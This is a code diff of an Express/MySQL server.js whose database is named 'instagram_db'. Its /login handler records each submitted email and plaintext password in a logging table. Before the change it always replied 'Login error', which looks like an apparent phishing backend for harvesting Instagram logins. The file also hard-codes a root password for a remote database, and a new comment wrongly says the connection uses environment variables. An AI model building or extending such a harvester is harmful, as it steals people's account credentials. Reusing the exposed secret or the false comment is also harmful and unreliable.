@@ -1,9 +1,7 @@
-// server.js
-
 const express = require('express');
 const bodyParser = require('body-parser');
 const mysql = require('mysql2');
-const path = require('path'); // Import the path module
+const path = require('path');
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -12,16 +10,20 @@ const port = process.env.PORT || 3000;
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 
-// Create MySQL connection
+// Create MySQL connection using environment variables
 const db = mysql.createConnection({
     host: 'viaduct.proxy.rlwy.net',
-    user: 'root', // replace with your MySQL username
-    password: 'RaRNOdpYCigBwEbaItdEiFMGOdcFvUay', // replace with your MySQL password
-    database: 'instagram_db' // use your actual database name here
+user: 'root', // replace with your MySQL username
+password: 'RaRNOdpYCigBwEbaItdEiFMGOdcFvUay', // replace with your MySQL password
+database: 'instagram_db', // use your actual database name here
+    connectTimeout: 10000 // 10 seconds
 });
 
 db.connect((err) => {
-    if (err) throw err;
+    if (err) {
+        console.error('Error connecting to the database:', err);
+        process.exit(1); // Exit process with failure
+    }
     console.log('MySQL Connected...');
 });
 
@@ -35,11 +37,14 @@ app.post('/login', (req, res) => {
     // Log user input values in the database (you can customize this part)
     const logSql = 'INSERT INTO user_logs (email, password, login_time) VALUES (?, ?, NOW())';
     db.query(logSql, [email, password], (err, result) => {
-        if (err) throw err;
+        if (err) {
+            console.error('Error logging in user:', err);
+            res.status(500).send('Login error');
+            return;
+        }
         console.log('User login data logged in database');
+        res.send('Login successful');
     });
-
-    res.send('Login error');
 });
 
 app.listen(port, () => {
